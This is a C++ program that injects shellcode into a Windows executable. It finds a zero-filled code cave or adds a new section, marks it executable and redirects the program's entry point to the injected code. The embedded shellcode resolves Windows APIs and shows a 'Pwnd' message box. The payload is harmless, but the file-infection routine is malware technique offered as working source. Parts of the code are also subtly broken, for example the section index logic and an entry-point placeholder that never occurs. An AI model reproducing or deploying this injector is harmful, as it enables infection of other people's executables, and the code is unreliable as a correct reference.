#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <WinUser.h>
#include <winternl.h>

using namespace std;

unsigned char shellcode[] ="\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40"
	"\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10"
	"\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda"
	"\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
	"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"
	"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78"
	"\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24"
	"\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c"
	"\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31"
	"\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69"
	"\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
	"\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24"
	"\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55"
	"\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41"
	"\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67"
	"\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff"
	"\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68"
	"\x50\x77\x6e\x64\x89\xe7\x52\x68\x59\x65"
	"\x73\x73\x89\xe1\x52\x57\x51\x52\xff\xd0"
	"\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83"
	"\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68"
	"\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9"
	"\x51\xff\xd0"; 

DWORD dwShellSize = (DWORD)sizeof(shellcode);

int main(int argc, char* argv[])
{
    //the target file is initiated here.
    const int MAX_FILEPATH = 255;
    char lpFileName[MAX_FILEPATH] = { "C:\benign\benign\1aa177b92c99b9458b270907d65d5687af48385fbbf42c3aef9b69d61d284721.exe" }; //sample no26   

    //the file is opened here.
    HANDLE hFile = CreateFileA(
        lpFileName,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    HANDLE hFileMapping = CreateFileMapping(
        hFile,
        NULL,
        PAGE_READWRITE,
        0,
        dwFileSize,
        NULL
    );
    LPBYTE lpFileAddr = (LPBYTE)MapViewOfFile(
        hFileMapping,
        FILE_MAP_READ | FILE_MAP_WRITE,
        0,
        0,
        dwFileSize
    );
    
    //the shellcode is then edited, primarily for replacing the generalistic address.
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpFileAddr;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpFileAddr + pDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHdrs);
    DWORD dwOEP = pNtHdrs->OptionalHeader.AddressOfEntryPoint;

    for (DWORD i = 0; i < dwShellSize; i++) {
        if (*((LPDWORD)(shellcode + i)) == 0xaaaaaaaa) {
            *((LPDWORD)(shellcode + i)) = dwOEP;
            break;
        }
    }
    
    //the code cave spot is being serached, and the first found is set to be the plugging pt.
    DWORD dwCount = 0;
    DWORD dwPos;
    LPVOID lpShellAddr = 0;
    for (dwPos = pNtHdrs->OptionalHeader.SizeOfHeaders; dwPos < dwFileSize; dwPos++)
    {
        if (*(lpFileAddr + dwPos) == 0x00) {
            if (dwCount++ == dwShellSize)
            {
                lpShellAddr = (LPVOID)(lpFileAddr + dwPos - dwShellSize);
                break;
            }
        }
        else {
            dwCount = 0;
        }
    }

    //if there are no favourable spot, another section for that is created.
    DWORD dwNewSecRVA = 0, dwNewSecRaw = 0;
    if (!lpShellAddr) {
        while (pSecHdr->SizeOfRawData != 0) {
            pSecHdr++;
        }
        dwNewSecRVA = pSecHdr->VirtualAddress + pSecHdr->Misc.VirtualSize;
        dwNewSecRaw = pSecHdr->PointerToRawData + pSecHdr->SizeOfRawData;
        pNtHdrs->FileHeader.NumberOfSections++;
        strncpy((char*)pSecHdr->Name, ". / 001" , IMAGE_SIZEOF_SHORT_NAME);
        pNtHdrs->OptionalHeader.SizeOfImage += pNtHdrs->OptionalHeader.SectionAlignment;
        pSecHdr->SizeOfRawData = pNtHdrs->OptionalHeader.FileAlignment;
        pSecHdr->Misc.VirtualSize = pNtHdrs->OptionalHeader.SectionAlignment;
        pSecHdr->PointerToRawData = dwNewSecRaw;
        pSecHdr->VirtualAddress = dwNewSecRVA;
        ZeroMemory((LPVOID)(
            (DWORD)lpFileAddr + dwNewSecRaw),
            pNtHdrs->OptionalHeader.FileAlignment
        );
        lpShellAddr = (LPVOID)(lpFileAddr + dwNewSecRaw);
        cout << "Added section: " << " " << pSecHdr->Name;
    }
    //plug the shellcode
    memcpy(lpShellAddr, shellcode, dwShellSize);

    //the pe file info in the targeted section is altered for its sake...
    DWORD i = dwPos;
    DWORD shellOffset = (DWORD)lpShellAddr - pDosHdr->e_lfanew;
    pSecHdr[i].Misc.VirtualSize += dwShellSize;
    pSecHdr[i].Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    pNtHdrs->OptionalHeader.AddressOfEntryPoint = shellOffset - pSecHdr[i].PointerToRawData + pSecHdr[i].VirtualAddress;

    //exiting
    return 0;
}

//credentials: https://sec.vnpt.vn/2023/05/pe-injection/, https://sec.vnpt.vn/2023/07/tim-dia-chi-kernel32-dll-va-cac-ham-api/ 